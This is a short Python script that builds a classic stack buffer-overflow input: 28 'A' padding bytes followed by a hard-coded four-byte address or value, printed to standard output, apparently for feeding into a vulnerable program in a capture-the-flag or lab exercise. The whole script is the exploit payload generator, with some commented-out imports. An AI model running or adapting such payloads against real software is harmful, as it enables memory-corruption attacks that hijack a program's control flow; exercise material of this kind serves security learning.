#!/usr/bin/env python

#import subprocess
#mport ctypes
#import pathlib


overload ="A"*28
value = "\xcd\x65\x58\x56"
#print(overload)
thisInput = str(overload)+str(value)
#thisInput = str(value) + str(overload)
print(thisInput)
